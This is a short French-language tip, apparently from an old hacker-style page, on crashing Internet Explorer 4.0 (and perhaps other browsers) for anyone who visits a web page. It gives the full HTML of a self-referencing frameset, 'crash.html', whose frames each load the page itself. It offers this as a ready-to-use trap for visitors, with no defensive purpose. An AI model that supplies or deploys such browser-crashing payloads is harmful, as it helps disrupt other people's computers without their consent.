vous savez surement faire planter windows, c facile il suffit de l'utiliser ! mais savez vous comment faire planter une personne utilisant internet explorer 4.0 (et peut etre tous les autres explorateurs) juste en leur fesant consulter une page web ?

d'abord il nous faut creer une page web avec des frames, et la methode consiste a faire que l'une des frames appeles le document sur le quel y'as les frames voila une source :

on va appeler cette page : "crash.html"

<html> <head>
<title>Bug</title>
</head>
<frameset framespacing="0" border="1" frameborder="1" cols="200,*">
<frame name="menu" src="crash.html" scrolling=auto marginwidth="0" marginheight="0" noresize>
<frame name="main" src="crash.html" scrolling=auto marginwidth="0" marginheight="0">
</frameset>
</html>
